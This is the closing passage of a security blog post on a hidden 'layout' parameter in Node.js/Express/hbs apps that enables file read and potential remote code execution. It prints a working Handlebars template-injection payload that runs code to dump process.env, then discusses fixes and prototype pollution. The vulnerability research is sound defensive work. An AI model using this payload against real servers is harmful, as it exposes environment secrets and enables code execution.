+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- (by [@avlidienbrunn](https://twitter.com/avlidienbrunn)) --&gt;</span><br><span class="line"></span><br><span class="line">&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#with &quot;e&quot;&#125;&#125;</span><br><span class="line">    &#123;&#123;#with split as |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;this.push (lookup string.sub &quot;constructor&quot;)&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;#with string.split as |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;this.push &quot;return JSON.stringify(process.env);&quot;&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#with (string.sub.apply 0 codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;this&#125;&#125;</span><br><span class="line">          &#123;&#123;/with&#125;&#125;</span><br><span class="line">        &#123;&#123;/each&#125;&#125;</span><br><span class="line">      &#123;&#123;/with&#125;&#125;</span><br><span class="line">    &#123;&#123;/with&#125;&#125;</span><br><span class="line">  &#123;&#123;/with&#125;&#125;</span><br><span class="line">&#123;&#123;/with&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Fix-🤕"><a href="#Fix-🤕" class="headerlink" title="Fix 🤕"></a>Fix 🤕</h2><p>Easy fix would be to stop using the code anti-pattern shown in the above example like below:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">❌ res.render(&apos;index&apos;, profile)</span><br></pre></td></tr></table></figure>
+<p>v/s</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">✅ res.render(&apos;index&apos;, &#123; profile &#125;)</span><br></pre></td></tr></table></figure>
+<p>which I think many devs use already so that they can be more descriptive in templates with the usage of just “&lbrace;&lbrace;name&rbrace;&rbrace;” vs “&lbrace;&lbrace;profile.name&rbrace;&rbrace;”.</p>
+<p>But think for a second again, is the above code safe? Yea sure, we don’t have a way to provide <code>layout</code> in the options argument to <code>res.render</code> anymore. But is there any way to still introduce the culprit <code>layout</code> parameter?</p>
+<h3 id="Prototype-Pollution"><a href="#Prototype-Pollution" class="headerlink" title="Prototype Pollution!"></a>Prototype Pollution!</h3><p>It would be ignorant if we don’t mention proto pollution in a Js/NodeJs Web Security writeup 🙃 !</p>
+<p>Readers who are unaware of proto pollution, please watch this <a href="https://www.youtube.com/watch?v=LUsiFV3dsK8" target="_blank" rel="noopener">awesome talk</a> from Olivier Arteau at NorthSec18.</p>
+<p>As you can see, even the most common pattern (<code>res.render(&#39;template&#39;, { profile })</code>) of passing objects to render function is not safe, If the application has prototype pollution at any place with which an attacker can add <code>layout</code> to prototype chain, the output of every call to <code>res.render</code> will be overwritten with LFR/RCE. So we have DoS-ish LFR/RCE! With presence of exploitable proto pollution, this becomes quite a good gadget plus becomes unfixable unless we fix proto pollution.</p>
+<p><strong>Solid Fix</strong></p>
+<ol>
+<li>First fix proto pollution if you are vulnerable to it.</li>
+<li>and you can remove the <code>layout</code> key from the object or do whatever to stop it from reaching that vulnerable Sink.</li>
+</ol>
+<p>Let me know what you think should be the proper fix?</p>
+<hr>
+<p>Above I have described my observations on a potentially critical vulnerability in the Setup of <strong>NodeJS + Express + HBS</strong>. </p>
+<p>As this setup is pretty common, I wanted this writeup to be out there. The handlebars engine particularly is very popular due to it’s support of HTML symantics. Everytime I work on a side-project, I quickly setup the boilerplate code with quick one liner of <a href="https://expressjs.com/en/starter/generator.html" target="_blank" rel="noopener">express-generator cli</a> <code>express --view hbs</code> and this creates the exact same stack the above issue is talking about. Don’t know how many time I might have used that code line myself. I plan to do the same kind of review for other view engines that express supports (ejs, hjs, jade, pug, twig, vash).</p>
+<p>Anyways, thanks for Reading! If something is erroneous, please let me know, would love to have a constructive discussion. </p>
+<p>It’s called Dependency Hell for a reason!</p>
+<p>Best,<br>CF</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/CaptainFreak">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BugBountyTip💰"><span class="toc-number">2.</span> <span class="toc-text">#BugBountyTip💰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Details"><span class="toc-number">3.</span> <span class="toc-text">Details</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Solution"><span class="toc-number"></span> <span class="toc-text">Challenge Solution</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Secret-layout-parameter"><span class="toc-number"></span> <span class="toc-text">Secret layout parameter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Source-Line-3"><span class="toc-number">0.1.</span> <span class="toc-text">Source (Line 3):</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Definition-of-res-render-in-ExpressJs-Link"><span class="toc-number">0.2.</span> <span class="toc-text">Definition of res.render in ExpressJs. Link</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Definition-of-req-app-render-in-ExpressJs-Link"><span class="toc-number">0.3.</span> <span class="toc-text">Definition of req.app.render in ExpressJs. Link</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#view-render-in-ExpressJs-Link"><span class="toc-number">0.4.</span> <span class="toc-text">view.render in ExpressJs. Link</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sink-Instantiation-in-hbs-Link"><span class="toc-number">1.</span> <span class="toc-text">Sink: Instantiation in hbs. Link</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-💣"><span class="toc-number"></span> <span class="toc-text">RCE 💣</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fix-🤕"><span class="toc-number"></span> <span class="toc-text">Fix 🤕</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prototype-Pollution"><span class="toc-number">1.</span> <span class="toc-text">Prototype Pollution!</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&text=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&title=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&is_video=false&description=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps&body=Check out this article: https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&title=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&title=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&title=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&title=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/&name=The Secret Parameter, LFR, and Potential RCE in NodeJS Apps&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2021 CaptainFreak
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/CaptainFreak">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-113860447-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'captainfreaks-infosec-blog';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
